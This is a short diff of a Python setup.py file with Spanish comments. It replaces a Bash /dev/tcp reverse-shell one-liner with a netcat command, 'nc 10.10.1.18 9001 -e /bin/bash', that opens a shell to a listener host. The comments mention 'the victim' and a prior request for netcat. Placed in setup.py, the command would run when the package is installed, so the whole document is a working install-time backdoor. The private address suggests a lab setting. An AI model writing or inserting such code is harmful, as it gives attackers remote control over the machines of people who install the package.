@@ -2,13 +2,8 @@ from setuptools import setup
 import subprocess
 import os
 
-# Definimos el comando de la Reverse Shell
-# Usamos un "one-liner" de Bash por si el nc de la víctima no soporta el flag -e
-LHOST = "10.10.1.18"
-LPORT = "9001"
-
 # Comando alternativo más compatible:
-cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
+cmd = f"nc 10.10.1.18 9001 -e /bin/bash"
 
 # Si prefieres usar estrictamente netcat como pediste:
 # cmd = f"nc {LHOST} {LPORT} -e /bin/bash &"
